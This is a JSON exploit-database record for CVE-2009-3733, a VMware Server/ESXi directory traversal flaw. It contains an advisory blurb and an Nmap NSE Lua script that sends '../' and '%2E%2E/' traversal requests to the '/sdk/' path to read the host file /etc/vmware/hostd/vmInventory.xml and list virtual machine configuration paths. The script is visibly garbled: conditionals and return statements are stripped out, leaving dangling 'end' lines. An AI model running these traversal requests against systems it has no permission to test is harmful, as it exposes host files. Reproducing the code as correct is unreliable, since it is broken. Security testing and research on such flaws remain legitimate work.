{
    "text": "ecve : CVE-2009-3733 ， title : VMware Server 2.0.1 / ESXi Server 3.5 - Directory Traversal - Multiple remote Exploit ， verified : Verified ， exploit_detail : source :  ， VMware products are prone to a directory-traversal vulnerability because they fail to sufficiently sanitize user-supplied input data. ， Exploiting the issue may allow an attacker to obtain sensitive information from the host operating system that could aid in further attacks. ， description = [  [  ， Checks for a path-traversal vulnerability in VMWare ESX , ESXi , and Server ( CVE-2009-3733 )  , originally released by Justin Morehouse ( justin.morehouse [ at ) gmail.com ) and Tony Flick ( tony.flick ( at ] fyrmassociates.com )  , and presented at Shmoocon 2010 (  ， -- @ usage ， -- nmap -script http-vmware-path-vuln -p80 , 443 , 8222 , 8333 <host> ， -- @ output ， -- | http-vmware-path-vuln :  ， -- | VMWare path traversal ( CVE-2009-3733 )  : VULNERABLE ， -- | /vmware/Windows 2003/Windows 2003.vmx ， -- | /vmware/Pentest/Pentest - Linux/Linux Pentest Bravo.vmx ， -- | /vmware/Pentest/Pentest - Windows/Windows 2003.vmx ， -- | /mnt/vmware/vmware/FreeBSD 7.2/FreeBSD 7.2.vmx ， -- | /mnt/vmware/vmware/FreeBSD 8.0/FreeBSD 8.0.vmx ， -- | /mnt/vmware/vmware/FreeBSD 8.0 64-bit/FreeBSD 8.0 64-bit.vmx ， -- | _ /mnt/vmware/vmware/Slackware 13 32-bit/Slackware 13 32-bit.vmx ， author = \"Ron Bowes\" ， license = \"Same as Nmap-See ， categories = {\"vuln\" , \"safe\" , \"default\"} ， require \"http\" ， require \"shortport\" ， portrule = shortport.port_or_service ( {80 , 443 , 8222 , 8333} , {\"http\" , \"https\"} )  ， local function get_file ( host , port , path )  ， local file ， -- Replace spaces in the path with %20 ， path = string.gsub ( path , \" \" , \"%%20\" )  ， -- Try both ../ and %2E%2E/ ， file = \"/sdk/../../../../../../\" .. path ， local result = http.get ( host , port , file )  ， file = \"/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/\" .. path ， result = http.get ( host , port , file )  ， end ， end ， end ， local function fake_xml_parse ( str , tag )  ， local result = {} ， local index , tag_start , tag_end ， -- Lowercase the 'body' we're searching ， local lc = string.lower ( str )  ， -- Lowrcase the tag ， tag = string.lower ( tag )  ， -- This loop does some ugly pattern-based xml parsing ， index , tag_start = string.find ( lc , \"<\" .. tag .. \">\" )  ， tag_end , index = string.find ( lc , \"</\" .. tag .. \">\" , index )  ， table.insert ( result , string.sub ( str , tag_start + 1 , tag_end - 1 )  ) -- note : not lowercase ， index , tag_start = string.find ( lc , \"<\" .. tag .. \">\" , index )  ， end ， end ， -local function parse_vmware_conf ( str , field )  ， -- local index , value_start = string.find ( str , field .. \" [ ^\\\" ]  * \" )  ， -- if ( not ( index ) or not ( value_start )  ) then ， -- return nil ， -- end ， -- local value_end = string.find ( str , \"\\\"\" , value_start + 1 )  ， -- if ( not ( value_end )  ) then ， -- return nil ， -- end ， -- return string.sub ( str , value_start + 1 , value_end - 1 )  ， -end ， local function go ( host , port )  ， local result , body ， local files ， -- Try to download the file ， result , body = get_file ( host , port , \"/etc/vmware/hostd/vmInventory.xml\" )  ;  ， -- It failed -- probably not vulnerable ， end ， -- Check if the file contains the proper XML ， end ， files = fake_xml_parse ( body , \"vmxcfgpath\" )  ， end ， -- Process each of the .vmx files if verbosity is on ， -- if ( nmap.verbosity (  ) > 1 ) then ， -- local result , file = get_file ( host , port , files [ 1 ]  )  ， -io.write ( nsedebug.tostr ( file )  )  ， -- end ， end ， action = function ( host , port )  ， -- Try a standard ../ path ， local status , result = go ( host , port )  ， end ， local response = {} ， table.insert ( response , \"VMWare path traversal ( CVE-2009-3733 )  : VULNERABLE\" )  ， table.insert ( response , result )  ， end ， end",
    "time": "2009-10-27"
}